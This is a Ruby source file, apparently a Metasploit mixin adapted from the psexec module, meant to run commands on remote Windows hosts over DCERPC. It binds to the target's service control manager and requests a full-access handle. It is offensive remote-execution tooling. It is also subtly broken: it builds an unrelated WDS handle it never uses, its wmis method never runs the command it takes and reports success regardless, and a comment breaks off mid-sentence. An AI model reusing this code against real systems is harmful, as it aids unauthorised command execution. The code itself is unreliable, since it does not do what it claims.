# -*- coding: binary -*-
require 'msf/core'
require 'msf/core/exploit/dcerpc'

module Msf

####
# Allows for reuse of the psexec code execution technique
#
# This code was stolen straight out of the psexec module. Thanks very
# much for all who contributed to that module!! Instead of uploading
# and running a binary.
####

module Exploit::Remote::DCERPC::Wmis

	include Msf::Exploit::Remote::DCERPC

	# Executes a single windows command.
	#
	# If you want to retrieve the output of your command you'll have to
	# echo it to a .txt file and then use the {#smb_read_file} method to
	# retrieve it.  Make sure to remove the files manually or use
	# {Exploit::FileDropper#register_files_for_cleanup} to have the
	# {Exploit::FileDropper#cleanup} and
	# {Exploit::FileDropper#on_new_session} handlers do it for you.
	#
	# @todo Figure out the actual exceptions this needs to deal with
	#   instead of all the ghetto "rescue ::Exception" madness
	# @param command [String] Should be a valid windows command
	# @return [Boolean] Whether everything went well
	def wmis(command)
		self.handle = Rex::Proto::DCERPC::Handle.new(
      		[
        		WDS_CONST::WDSCP_RPC_UUID,
        		'2.0',
        		'71710533-beba-4937-8319-b5dbef9ccc36',
        		1
      		],
      		'ncacn_ip_tcp',
      		rhost,
      		[datastore['RPORT']]
    		) 
		simple.connect("\\\\#{datastore['RHOST']}\\IPC$")
		handle = dcerpc_handle('367abb81-9844-35f1-ad32-98f038001003', '2.0', 'ncacn_np', ["\\svcctl"])
		vprint_status("#{peer} - Binding to #{handle} ...")
		dcerpc_bind(handle)
		vprint_status("#{peer} - Bound to #{handle} ...")
		vprint_status("#{peer} - Obtaining a service manager handle...")
		scm_handle = nil
		stubdata = NDR.uwstring("\\\\#{rhost}") + NDR.long(0) + NDR.long(0xF003F)
		begin
			response = dcerpc.call(0x0f, stubdata)
			if dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil
				scm_handle = dcerpc.last_response.stub_data[0,20]
			end
		rescue ::Exception => e
			print_error("#{peer} - Error getting scm handle: #{e}")
			return false
		end
		return true
	end

end

end
